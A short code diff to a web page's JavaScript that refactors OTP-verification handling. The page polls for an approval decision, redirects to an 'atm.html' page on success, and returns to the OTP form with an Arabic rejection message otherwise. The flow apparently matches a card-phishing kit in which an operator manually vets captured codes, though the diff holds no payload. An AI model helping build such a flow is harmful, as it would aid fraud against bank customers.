@@ -377,9 +377,17 @@
 
     function redirectToAtm(){
       stopPoll();
-      if (waitOverlay) waitOverlay.classList.remove('show');
+      waitOverlay.classList.remove('show');
       if (requestId) {
         window.location.href = 'atm.html?id=' + requestId;
+      }
+    }
+
+    function goBackToOtpWithError(message){
+      stopPoll();
+      waitOverlay.classList.remove('show');
+      if (requestId) {
+        window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(message) + '&id=' + requestId;
       }
     }
 
@@ -395,13 +403,9 @@
               redirectToAtm();
             } else if (isRejectedStatus(status)) {
               stopPoll();
-              if (waitOverlay) waitOverlay.classList.remove('show');
-              if (rejectOverlay) rejectOverlay.classList.add('show');
-              if (otpForm) otpForm.style.display = 'block';
-              if (otpInput) otpInput.disabled = false;
-              if (verifyBtn) verifyBtn.disabled = false;
-              var msg = 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
-              window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
+              waitOverlay.classList.remove('show');
+              var rejectMessage = 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
+              goBackToOtpWithError(rejectMessage);
             }
           })
           .catch(function(err){
@@ -435,7 +439,6 @@
           pollOtpStatus();
           return;
         }
-        // لا نعرض رفضًا فورياً هنا؛ المستخدم يبقى في حالة الانتظار حتى قرار الإدارة.
         pollOtpStatus();
       })
       .catch(function(err){
